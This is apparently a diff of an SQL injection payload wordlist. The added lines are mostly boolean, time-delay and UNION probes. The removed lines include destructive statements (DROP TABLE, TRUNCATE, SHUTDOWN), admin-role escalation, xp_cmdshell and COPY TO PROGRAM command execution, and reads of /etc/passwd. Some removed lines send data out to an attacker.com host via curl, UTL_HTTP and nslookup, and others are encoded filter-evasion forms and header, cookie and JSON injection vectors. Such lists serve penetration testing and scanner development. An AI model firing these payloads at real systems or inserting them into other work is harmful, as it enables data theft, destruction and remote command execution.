+") OR (" OR NOT DATABASE()=DATABASE()#
+") OR (" OR NOT DATABASE()=DATABASE();%00
+") OR (" OR NOT DATABASE()=DATABASE()/*
+") OR (" OR NOT DATABASE()=DATABASE()/**/
+") OR (" OR NOT DATABASE()=DATABASE()
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0--
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0-- -
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0#
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0;%00
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0/*
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0/**/
+") OR (" OR NOT (SELECT COUNT(*) FROM users)>0
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" OR NOT SLEEP(2)--
+") OR (" OR NOT SLEEP(2)-- -
+") OR (" OR NOT SLEEP(2)#
+") OR (" OR NOT SLEEP(2);%00
+") OR (" OR NOT SLEEP(2)/*
+") OR (" OR NOT SLEEP(2)/**/
+") OR (" OR NOT SLEEP(2)
+") OR (" OR NOT SLEEP(5)--
+") OR (" OR NOT SLEEP(5)-- -
+") OR (" OR NOT SLEEP(5)#
+") OR (" OR NOT SLEEP(5);%00
+") OR (" OR NOT SLEEP(5)/*
+") OR (" OR NOT SLEEP(5)/**/
+") OR (" OR NOT SLEEP(5)
+") OR (" OR NOT BENCHMARK(100000,MD5(1))--
+") OR (" OR NOT BENCHMARK(100000,MD5(1))-- -
+") OR (" OR NOT BENCHMARK(100000,MD5(1))#
+") OR (" OR NOT BENCHMARK(100000,MD5(1));%00
+") OR (" OR NOT BENCHMARK(100000,MD5(1))/*
+") OR (" OR NOT BENCHMARK(100000,MD5(1))/**/
+") OR (" OR NOT BENCHMARK(100000,MD5(1))
+") OR (" OR NOT pg_sleep(2)--
+") OR (" OR NOT pg_sleep(2)-- -
+") OR (" OR NOT pg_sleep(2)#
+") OR (" OR NOT pg_sleep(2);%00
+") OR (" OR NOT pg_sleep(2)/*
+") OR (" OR NOT pg_sleep(2)/**/
+") OR (" OR NOT pg_sleep(2)
+") OR (" OR NOT pg_sleep(5)--
+") OR (" OR NOT pg_sleep(5)-- -
+") OR (" OR NOT pg_sleep(5)#
+") OR (" OR NOT pg_sleep(5);%00
+") OR (" OR NOT pg_sleep(5)/*
+") OR (" OR NOT pg_sleep(5)/**/
+") OR (" OR NOT pg_sleep(5)
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" OR NOT EXISTS(SELECT * FROM information_schema.tables)
+") OR (" AND NOT 1=1--
+") OR (" AND NOT 1=1-- -
+") OR (" AND NOT 1=1#
+") OR (" AND NOT 1=1;%00
+") OR (" AND NOT 1=1/*
+") OR (" AND NOT 1=1/**/
+") OR (" AND NOT 1=1
+") OR (" AND NOT 1=2--
+") OR (" AND NOT 1=2-- -
+") OR (" AND NOT 1=2#
+") OR (" AND NOT 1=2;%00
+") OR (" AND NOT 1=2/*
+") OR (" AND NOT 1=2/**/
+") OR (" AND NOT 1=2
+") OR (" AND NOT 'a'='a'--
+") OR (" AND NOT 'a'='a'-- -
+") OR (" AND NOT 'a'='a'#
+") OR (" AND NOT 'a'='a';%00
+") OR (" AND NOT 'a'='a'/*
+") OR (" AND NOT 'a'='a'/**/
+") OR (" AND NOT 'a'='a'
+") OR (" AND NOT 'x'='y'--
+") OR (" AND NOT 'x'='y'-- -
+") OR (" AND NOT 'x'='y'#
+") OR (" AND NOT 'x'='y';%00
+") OR (" AND NOT 'x'='y'/*
+") OR (" AND NOT 'x'='y'/**/
+") OR (" AND NOT 'x'='y'
+") OR (" AND NOT user()=user()--
+") OR (" AND NOT user()=user()-- -
+") OR (" AND NOT user()=user()#
+") OR (" AND NOT user()=user();%00
+") OR (" AND NOT user()=user()/*
+") OR (" AND NOT user()=user()/**/
+") OR (" AND NOT user()=user()
+") OR (" AND NOT version()=version()--
+") OR (" AND NOT version()=version()-- -
+") OR (" AND NOT version()=version()#
+") OR (" AND NOT version()=version();%00
+") OR (" AND NOT version()=version()/*
+") OR (" AND NOT version()=version()/**/
+") OR (" AND NOT version()=version()
+") OR (" AND NOT DATABASE()=DATABASE()--
+") OR (" AND NOT DATABASE()=DATABASE()-- -
+") OR (" AND NOT DATABASE()=DATABASE()#
+") OR (" AND NOT DATABASE()=DATABASE();%00
+") OR (" AND NOT DATABASE()=DATABASE()/*
+") OR (" AND NOT DATABASE()=DATABASE()/**/
+") OR (" AND NOT DATABASE()=DATABASE()
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0--
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0-- -
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0#
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0;%00
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0/*
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0/**/
+") OR (" AND NOT (SELECT COUNT(*) FROM users)>0
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" AND NOT SLEEP(2)--
+") OR (" AND NOT SLEEP(2)-- -
+") OR (" AND NOT SLEEP(2)#
+") OR (" AND NOT SLEEP(2);%00
+") OR (" AND NOT SLEEP(2)/*
+") OR (" AND NOT SLEEP(2)/**/
+") OR (" AND NOT SLEEP(2)
+") OR (" AND NOT SLEEP(5)--
+") OR (" AND NOT SLEEP(5)-- -
+") OR (" AND NOT SLEEP(5)#
+") OR (" AND NOT SLEEP(5);%00
+") OR (" AND NOT SLEEP(5)/*
+") OR (" AND NOT SLEEP(5)/**/
+") OR (" AND NOT SLEEP(5)
+") OR (" AND NOT BENCHMARK(100000,MD5(1))--
+") OR (" AND NOT BENCHMARK(100000,MD5(1))-- -
+") OR (" AND NOT BENCHMARK(100000,MD5(1))#
+") OR (" AND NOT BENCHMARK(100000,MD5(1));%00
+") OR (" AND NOT BENCHMARK(100000,MD5(1))/*
+") OR (" AND NOT BENCHMARK(100000,MD5(1))/**/
+") OR (" AND NOT BENCHMARK(100000,MD5(1))
+") OR (" AND NOT pg_sleep(2)--
+") OR (" AND NOT pg_sleep(2)-- -
+") OR (" AND NOT pg_sleep(2)#
+") OR (" AND NOT pg_sleep(2);%00
+") OR (" AND NOT pg_sleep(2)/*
+") OR (" AND NOT pg_sleep(2)/**/
+") OR (" AND NOT pg_sleep(2)
+") OR (" AND NOT pg_sleep(5)--
+") OR (" AND NOT pg_sleep(5)-- -
+") OR (" AND NOT pg_sleep(5)#
+") OR (" AND NOT pg_sleep(5);%00
+") OR (" AND NOT pg_sleep(5)/*
+") OR (" AND NOT pg_sleep(5)/**/
+") OR (" AND NOT pg_sleep(5)
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" AND NOT EXISTS(SELECT * FROM information_schema.tables)
+") OR (" OR EXISTS 1=1--
+") OR (" OR EXISTS 1=1-- -
+") OR (" OR EXISTS 1=1#
+") OR (" OR EXISTS 1=1;%00
+") OR (" OR EXISTS 1=1/*
+") OR (" OR EXISTS 1=1/**/
+") OR (" OR EXISTS 1=1
+") OR (" OR EXISTS 1=2--
+") OR (" OR EXISTS 1=2-- -
+") OR (" OR EXISTS 1=2#
+") OR (" OR EXISTS 1=2;%00
+") OR (" OR EXISTS 1=2/*
+") OR (" OR EXISTS 1=2/**/
+") OR (" OR EXISTS 1=2
+") OR (" OR EXISTS 'a'='a'--
+") OR (" OR EXISTS 'a'='a'-- -
+") OR (" OR EXISTS 'a'='a'#
+") OR (" OR EXISTS 'a'='a';%00
+") OR (" OR EXISTS 'a'='a'/*
+") OR (" OR EXISTS 'a'='a'/**/
+") OR (" OR EXISTS 'a'='a'
+") OR (" OR EXISTS 'x'='y'--
+") OR (" OR EXISTS 'x'='y'-- -
+") OR (" OR EXISTS 'x'='y'#
+") OR (" OR EXISTS 'x'='y';%00
+") OR (" OR EXISTS 'x'='y'/*
+") OR (" OR EXISTS 'x'='y'/**/
+") OR (" OR EXISTS 'x'='y'
+") OR (" OR EXISTS user()=user()--
+") OR (" OR EXISTS user()=user()-- -
+") OR (" OR EXISTS user()=user()#
+") OR (" OR EXISTS user()=user();%00
+") OR (" OR EXISTS user()=user()/*
+") OR (" OR EXISTS user()=user()/**/
+") OR (" OR EXISTS user()=user()
+") OR (" OR EXISTS version()=version()--
+") OR (" OR EXISTS version()=version()-- -
+") OR (" OR EXISTS version()=version()#
+") OR (" OR EXISTS version()=version();%00
+") OR (" OR EXISTS version()=version()/*
+") OR (" OR EXISTS version()=version()/**/
+") OR (" OR EXISTS version()=version()
+") OR (" OR EXISTS DATABASE()=DATABASE()--
+") OR (" OR EXISTS DATABASE()=DATABASE()-- -
+") OR (" OR EXISTS DATABASE()=DATABASE()#
+") OR (" OR EXISTS DATABASE()=DATABASE();%00
+") OR (" OR EXISTS DATABASE()=DATABASE()/*
+") OR (" OR EXISTS DATABASE()=DATABASE()/**/
+") OR (" OR EXISTS DATABASE()=DATABASE()
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0--
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0#
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+") OR (" OR EXISTS (SELECT COUNT(*) FROM users)>0
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" OR EXISTS SLEEP(2)--
+") OR (" OR EXISTS SLEEP(2)-- -
+") OR (" OR EXISTS SLEEP(2)#
+") OR (" OR EXISTS SLEEP(2);%00
+") OR (" OR EXISTS SLEEP(2)/*
+") OR (" OR EXISTS SLEEP(2)/**/
+") OR (" OR EXISTS SLEEP(2)
+") OR (" OR EXISTS SLEEP(5)--
+") OR (" OR EXISTS SLEEP(5)-- -
+") OR (" OR EXISTS SLEEP(5)#
+") OR (" OR EXISTS SLEEP(5);%00
+") OR (" OR EXISTS SLEEP(5)/*
+") OR (" OR EXISTS SLEEP(5)/**/
+") OR (" OR EXISTS SLEEP(5)
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))--
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))-- -
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))#
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1));%00
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))/*
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))/**/
+") OR (" OR EXISTS BENCHMARK(100000,MD5(1))
+") OR (" OR EXISTS pg_sleep(2)--
+") OR (" OR EXISTS pg_sleep(2)-- -
+") OR (" OR EXISTS pg_sleep(2)#
+") OR (" OR EXISTS pg_sleep(2);%00
+") OR (" OR EXISTS pg_sleep(2)/*
+") OR (" OR EXISTS pg_sleep(2)/**/
+") OR (" OR EXISTS pg_sleep(2)
+") OR (" OR EXISTS pg_sleep(5)--
+") OR (" OR EXISTS pg_sleep(5)-- -
+") OR (" OR EXISTS pg_sleep(5)#
+") OR (" OR EXISTS pg_sleep(5);%00
+") OR (" OR EXISTS pg_sleep(5)/*
+") OR (" OR EXISTS pg_sleep(5)/**/
+") OR (" OR EXISTS pg_sleep(5)
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+") OR (" AND EXISTS 1=1--
+") OR (" AND EXISTS 1=1-- -
+") OR (" AND EXISTS 1=1#
+") OR (" AND EXISTS 1=1;%00
+") OR (" AND EXISTS 1=1/*
+") OR (" AND EXISTS 1=1/**/
+") OR (" AND EXISTS 1=1
+") OR (" AND EXISTS 1=2--
+") OR (" AND EXISTS 1=2-- -
+") OR (" AND EXISTS 1=2#
+") OR (" AND EXISTS 1=2;%00
+") OR (" AND EXISTS 1=2/*
+") OR (" AND EXISTS 1=2/**/
+") OR (" AND EXISTS 1=2
+") OR (" AND EXISTS 'a'='a'--
+") OR (" AND EXISTS 'a'='a'-- -
+") OR (" AND EXISTS 'a'='a'#
+") OR (" AND EXISTS 'a'='a';%00
+") OR (" AND EXISTS 'a'='a'/*
+") OR (" AND EXISTS 'a'='a'/**/
+") OR (" AND EXISTS 'a'='a'
+") OR (" AND EXISTS 'x'='y'--
+") OR (" AND EXISTS 'x'='y'-- -
+") OR (" AND EXISTS 'x'='y'#
+") OR (" AND EXISTS 'x'='y';%00
+") OR (" AND EXISTS 'x'='y'/*
+") OR (" AND EXISTS 'x'='y'/**/
+") OR (" AND EXISTS 'x'='y'
+") OR (" AND EXISTS user()=user()--
+") OR (" AND EXISTS user()=user()-- -
+") OR (" AND EXISTS user()=user()#
+") OR (" AND EXISTS user()=user();%00
+") OR (" AND EXISTS user()=user()/*
+") OR (" AND EXISTS user()=user()/**/
+") OR (" AND EXISTS user()=user()
+") OR (" AND EXISTS version()=version()--
+") OR (" AND EXISTS version()=version()-- -
+") OR (" AND EXISTS version()=version()#
+") OR (" AND EXISTS version()=version();%00
+") OR (" AND EXISTS version()=version()/*
+") OR (" AND EXISTS version()=version()/**/
+") OR (" AND EXISTS version()=version()
+") OR (" AND EXISTS DATABASE()=DATABASE()--
+") OR (" AND EXISTS DATABASE()=DATABASE()-- -
+") OR (" AND EXISTS DATABASE()=DATABASE()#
+") OR (" AND EXISTS DATABASE()=DATABASE();%00
+") OR (" AND EXISTS DATABASE()=DATABASE()/*
+") OR (" AND EXISTS DATABASE()=DATABASE()/**/
+") OR (" AND EXISTS DATABASE()=DATABASE()
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0--
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0#
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+") OR (" AND EXISTS (SELECT COUNT(*) FROM users)>0
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" AND EXISTS SLEEP(2)--
+") OR (" AND EXISTS SLEEP(2)-- -
+") OR (" AND EXISTS SLEEP(2)#
+") OR (" AND EXISTS SLEEP(2);%00
+") OR (" AND EXISTS SLEEP(2)/*
+") OR (" AND EXISTS SLEEP(2)/**/
+") OR (" AND EXISTS SLEEP(2)
+") OR (" AND EXISTS SLEEP(5)--
+") OR (" AND EXISTS SLEEP(5)-- -
+") OR (" AND EXISTS SLEEP(5)#
+") OR (" AND EXISTS SLEEP(5);%00
+") OR (" AND EXISTS SLEEP(5)/*
+") OR (" AND EXISTS SLEEP(5)/**/
+") OR (" AND EXISTS SLEEP(5)
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))--
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))-- -
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))#
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1));%00
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))/*
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))/**/
+") OR (" AND EXISTS BENCHMARK(100000,MD5(1))
+") OR (" AND EXISTS pg_sleep(2)--
+") OR (" AND EXISTS pg_sleep(2)-- -
+") OR (" AND EXISTS pg_sleep(2)#
+") OR (" AND EXISTS pg_sleep(2);%00
+") OR (" AND EXISTS pg_sleep(2)/*
+") OR (" AND EXISTS pg_sleep(2)/**/
+") OR (" AND EXISTS pg_sleep(2)
+") OR (" AND EXISTS pg_sleep(5)--
+") OR (" AND EXISTS pg_sleep(5)-- -
+") OR (" AND EXISTS pg_sleep(5)#
+") OR (" AND EXISTS pg_sleep(5);%00
+") OR (" AND EXISTS pg_sleep(5)/*
+") OR (" AND EXISTS pg_sleep(5)/**/
+") OR (" AND EXISTS pg_sleep(5)
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+' UNION SELECT NULL--
 ' UNION ALL SELECT NULL--
+' UNION SELECT NULL-- -
+' UNION ALL SELECT NULL-- -
+' UNION SELECT NULL#
+' UNION ALL SELECT NULL#
+' UNION SELECT NULL;%00
+' UNION ALL SELECT NULL;%00
+' UNION SELECT NULL/*
+' UNION ALL SELECT NULL/*
+' UNION SELECT NULL/**/
+' UNION ALL SELECT NULL/**/
+' UNION SELECT NULL
+' UNION ALL SELECT NULL
+' UNION SELECT NULL,NULL--
 ' UNION ALL SELECT NULL,NULL--
+' UNION SELECT NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL#
+' UNION ALL SELECT NULL,NULL#
+' UNION SELECT NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL;%00
+' UNION SELECT NULL,NULL/*
+' UNION ALL SELECT NULL,NULL/*
+' UNION SELECT NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL/**/
+' UNION SELECT NULL,NULL
+' UNION ALL SELECT NULL,NULL
+' UNION SELECT NULL,NULL,NULL--
 ' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL--
 ' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
 ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
 ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--
-' UNION SELECT username,password FROM users--
-' UNION SELECT user(),database()--
-' UNION SELECT table_name,column_name FROM information_schema.columns--
-' UNION SELECT NULL,@@version--
-' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
-' UNION SELECT NULL,@@datadir--
-' UNION SELECT NULL,version()--
-' UNION SELECT current_user,version()--
-' UNION SELECT name,sql FROM sqlite_master--
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT NULL,string_agg(table_name,',') FROM information_schema.tables--
-' UNION SELECT NULL,xmltype('<!DOCTYPE a SYSTEM "file:///etc/passwd">') FROM dual--
-' UNION SELECT NULL,@@hostname--
-' UNION SELECT NULL,pg_read_file('/etc/passwd',0,200)--
-' UNION SELECT NULL,pg_ls_dir('/')--
-' UNION SELECT NULL,CAST(current_user AS NVARCHAR(4000))--
-' UNION SELECT 1,pg_sleep(5)--
-' UNION SELECT 1,if(1=1,sleep(5),0)--
-' UNION SELECT NULL,CHR(65)||CHR(66)||CHR(67)--
-1' AND 1=1--
-1' AND 1=2--
-1' AND '1'='1'--
-1' AND ASCII(SUBSTRING(@@version,1,1))=53--
-1' AND LENGTH(DATABASE())>5--
-1' AND ORD(SUBSTR(USER(),1,1))>64--
-1' AND EXISTS(SELECT 1 FROM users)--
-1' AND (SELECT COUNT(*) FROM users)>0--
-1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
-1 AND 1=1
-1 AND 1=2
-1 OR 1=1
-1 AND ASCII(SUBSTRING((SELECT database()),1,1))=100
-1 AND (SELECT 1 FROM dual WHERE ROWNUM=1)=1
-1 AND EXISTS(SELECT 1 FROM pg_class)
-1 AND EXISTS(SELECT 1 FROM sqlite_master)
-1' AND SLEEP(5)--
-1' AND SLEEP(10)--
-1' AND BENCHMARK(5000000,MD5(1))--
-1';SELECT pg_sleep(5);--
-1';SELECT pg_sleep(10);--
-1';WAITFOR DELAY '0:0:5';--
-1';WAITFOR DELAY '0:0:10';--
-1' AND IF(1=1,SLEEP(5),0)--
-1' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--
-1' AND (SELECT 1 FROM PG_SLEEP(5))--
-1' AND dbms_pipe.receive_message('a',5)=0 --
-1' AND UTL_INADDR.get_host_address('localhost') IS NOT NULL AND dbms_pipe.receive_message('x',5)=0 --
-1 AND SLEEP(5)
-1;SELECT pg_sleep(5);
-1;WAITFOR DELAY '00:00:05';
-1';DROP TABLE users;--
-1';TRUNCATE TABLE audit;--
-1';INSERT INTO logs(data) VALUES('test');--
-1';CREATE TABLE pwned(id INT);--
-1';UPDATE users SET role='admin' WHERE username='guest';--
-1';EXEC xp_cmdshell('whoami');--
-1';SHUTDOWN WITH NOWAIT;--
-1';ALTER TABLE users ADD COLUMN hacked INT;--
-1';DECLARE @x NVARCHAR(200);SET @x=@@version;INSERT INTO logs(info) VALUES(@x);--
-1';COPY (SELECT current_database()) TO PROGRAM 'id';--
-1';COPY (SELECT 'p') TO PROGRAM 'ping -c 1 attacker';--
-1';BEGIN DBMS_LOCK.SLEEP(5); END;--
-1';EXEC('SELECT pg_sleep(5)');--
-';SELECT @@version;--
-';SELECT user();--
-';SELECT database();--
-';SELECT name FROM master..sysdatabases;--
-';SELECT table_name FROM information_schema.tables;--
-';SELECT version();--
-';SELECT * FROM sqlite_master;--
-';SELECT current_setting('server_version');--
-';SELECT pg_read_file('/etc/hosts',0,200);--
-';SELECT LOAD_FILE('/etc/hosts');--
-1' UNION SELECT NULL,LOAD_FILE('\\attacker.com\share')--
-1' INTO OUTFILE '/tmp/pwned.txt' SELECT user()--
-1' UNION SELECT NULL,@@version INTO OUTFILE '/tmp/v.txt'--
-1';EXEC master..xp_dirtree ' \\remote\share';--
-1';DECLARE @r INT;EXEC @r=master..xp_cmdshell 'nslookup attacker.com';--
-1';SELECT pg_read_file('/etc/passwd');--
-1' UNION SELECT NULL,pg_read_file('/etc/passwd',0,100)--
-1';COPY (SELECT version()) TO PROGRAM 'curl attacker.com/`whoami`';--
-1' UNION SELECT UTL_INADDR.get_host_name('127.0.0.1'), NULL FROM dual--
-1' AND UTL_HTTP.request('http://attacker.com/'||user)||''='x
-1' AND EXTRACTVALUE(xmltype('<!DOCTYPE a SYSTEM "http://attacker.com">'),'a')='x
-1' oR 1=1--
-1' OR/**/1=1--
-1' OR/*!50000*/1=1--
-1' OR 1=1;%00
-1' OR '1'='1' AND 'x' LIKE 'x
-1' OR '1'='1' RLIKE ('[a-z]')
-1' OR '1'='1'/**/UNION/**/SELECT/**/NULL--
-1' OR '1'='1'/*!12345UNION*/SELECT 1,2--
-1' oRlY 1=1--
-1' UNI/**/ON SEL/**/ECT 1,2--
-1'||(SeLeCt+@@version)||'
-'/**/OR/**/'1'/**/=/**/'1
-' OR '1'='1' && SLEEP(1)--
-' OR '1'='1' || pg_sleep(1)--
-' || '1'='1' --
-%27%20OR%20%271%27%3D%271%27--%20
-%2527%2520OR%2520%25271%2527%253D%25271%2527--%2520
-%27%20oR%20%271%27%3D%271%27--%20
-%27%20OR%201%3D1%23
-%27%20OR%20%271%27%3D%271%27%2F*
-%27)%20OR%20(1%3D1)%20--%20
-%bf%27%20OR%201%3D1--
-%27%2bOR%2b1%3d1--
-0x274f5220313d310a
-0x27206f72202731273d2731
-CHAR(39)||' OR '||CHAR(49)=CHAR(49)
-CHAR(39)+OR+CHAR(49)+=+CHAR(49)--
-UNHEX('27206f7220313d31')
-0x61646d696e27206f7220313d31
-CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(49),CHAR(61),CHAR(49))
-0x73656c65637420757365722c70617373776f72642066726f6d207573657273
-User-Agent: ' OR 1=1--
-User-Agent: ') OR ('1'='1
-User-Agent: ' UNION SELECT user(),database()--
-X-Forwarded-For: 127.0.0.1' OR '1'='1
-X-Originating-IP: 1.1.1.1' UNION SELECT NULL,@@version--
-Referer: ' OR '1'='1'--
-Cookie: session=abc' OR '1'='1--
-Cookie: uid=1; role=';UPDATE users SET role='admin' WHERE username='guest';--
-Cookie: token='||(SELECT current_user)||'
-Cookie: auth=xyz';WAITFOR DELAY '0:0:5';--
-Authorization: Basic YWRtaW4nIE9SIH4nMSc9JzE=
-{"user":"admin' OR '1'='1","pass":"x"}
-{"search":"%' OR 1=1--"}
-{"id":"1;DROP TABLE users;--"}
